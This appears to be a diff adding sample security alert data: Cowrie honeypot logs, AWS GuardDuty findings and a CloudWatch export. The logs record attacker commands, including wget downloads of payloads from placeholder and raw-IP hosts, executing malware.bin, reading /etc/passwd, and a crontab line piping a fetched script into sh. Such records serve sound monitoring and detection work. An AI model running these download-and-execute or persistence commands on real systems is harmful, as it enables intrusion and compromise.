@@ -1,9 +1,26 @@
-cowrie-attack-log.txt
+Alerts from Cowrie
 
+cowrie-attack-log.txt
 2025-07-01 10:32:14 login attempt [root:123456] from 185.142.234.9
 2025-07-01 10:32:19 command issued: wget http://malicious.com/payload.sh
 2025-07-01 10:32:22 command issued: chmod +x payload.sh
+2025-07-01 10:32:14 login attempt [root:123456] from 185.142.234.9
+2025-07-01 10:32:19 command issued: wget http://malicious.com/payload.sh
+2025-07-01 10:32:22 command issued: chmod +x payload.sh
+2025-07-01 14:21:03 login attempt [admin:1234] from 61.177.172.66
+2025-07-01 14:21:15 login attempt [user:pass123] from 190.92.87.30
+2025-07-01 14:22:01 login attempt [root:qwerty] from 185.234.219.245
+2025-07-01 14:23:47 login attempt [guest:guest] from 84.38.130.41
+2025-07-01 14:25:02 command issued: wget http://185.86.149.125/malware.bin
+2025-07-01 14:25:04 command issued: chmod +x malware.bin
+2025-07-01 14:25:05 command issued: ./malware.bin
+2025-07-01 14:30:21 command issued: uname -a
+2025-07-01 14:30:23 command issued: cat /etc/passwd
+2025-07-01 14:30:25 command issued: ps aux
+2025-07-01 14:40:12 command issued: echo '* * * * * wget http://malicious.org/bot.sh | sh' >> /etc/crontab
+2025-07-01 14:40:14 command issued: ping -c 4 8.8.8.8
 
+Alerts from AWS Guarduty 
 guardduty-findings.json
 {
 "type": "Recon:EC2/PortProbeUnprotectedPort",
@@ -16,3 +33,57 @@ guardduty-findings.json
 "protocol": "TCP"
 }
 }
+
+[
+  {
+    "type": "Recon:EC2/PortProbeUnprotectedPort",
+    "resource": { "instanceId": "i-abc123" },
+    "remoteIpDetails": { "ipAddressV4": "185.142.234.9" },
+    "service": {
+      "action": {
+        "portProbeAction": {
+          "port": 22,
+          "protocol": "TCP"
+        }
+      }
+    }
+  },
+  {
+    "type": "UnauthorizedAccess:EC2/SSHBruteForce",
+    "resource": { "instanceId": "i-0011223344" },
+    "service": {
+      "action": {
+        "networkConnectionAction": {
+          "remoteIpDetails": {
+            "ipAddressV4": "146.70.23.5",
+            "organization": { "asnOrg": "AS12876 Online S.A.S." }
+          },
+          "protocol": "TCP",
+          "port": 22
+        }
+      },
+      "additionalInfo": {
+        "threatListName": "AbuseIPDB Top 10K"
+      }
+    }
+  }
+]
+
+Alert from CloudWatch
+cloudwatch-export.json
+
+[
+  {
+    "logStreamName": "cowrie-instance1",
+    "message": "2025-07-01 login attempt [admin:password] from 103.21.244.0"
+  },
+  {
+    "logStreamName": "cowrie-instance1",
+    "message": "2025-07-01 14:25:02 command issued: wget http://185.86.149.125/malware.bin"
+  },
+  {
+    "logStreamName": "cowrie-instance1",
+    "message": "2025-07-01 14:40:12 command issued: echo '* * * * * wget http://malicious.org/bot.sh | sh' >> /etc/crontab"
+  }
+]
+
